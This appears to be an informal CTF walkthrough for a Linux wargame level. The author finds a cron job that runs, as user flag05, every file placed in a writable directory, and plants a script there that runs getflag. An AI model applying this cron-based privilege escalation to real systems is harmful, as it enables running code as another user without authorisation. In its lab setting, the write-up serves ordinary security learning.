ls

nothing...

we will try to check what file ar from the flag05

find / -user flag05 2> /dev/null
|
L-> /usr/sbin/openarenaserver

what is this ?

I can't execute it or whatever, i just know that the owner is flag05 so we need th make it execute getflag
what's inside ?

cat /usr/sbin/openarenaserver
|
L-> #!/bin/sh
L-> for i in /opt/openarenaserver/* ; do
L->     (ulimit -t 5; bash -x "$i")
L->     rm -f "$i"
L-> done

a shell script ? it's look like it enumerate file from /opt/openarenaserver 
then it execute what's inside the file in bash then delete the file
ok cool we can execute getflag from this wy writing it into a file in /opt/openarenaserver
but there is a problem, how can we execute it ?
root escalation ? I don't think because it will be cheat
I try to see last command I type and... ohhh
after logged in I didn't see a thing... "You have a new mail" what is that ?

find / -name "mail" 2> /dev/null
|
L> /var/mail

ls /var/mail
|
L-> level05

oooh looks cool

cat /var/mail/level05
|
L-> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

bingo, it's look like a crontab script, it be executed every 2 minutes so.. we don't need to execute it !
it's execute automaticaly :D 

but as a cron script, we don't have the output so we need to put it in a file
we know that everyfile in /opt/openarenaserver will be deleted just after the script run, so we don't 
want to output a file here, and the user flag05 don't have access to our home so we can just outpout
it in a /tmp file !

echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/script

I cat it unless... oh it disapear ! sooo

cat /tmp/flag
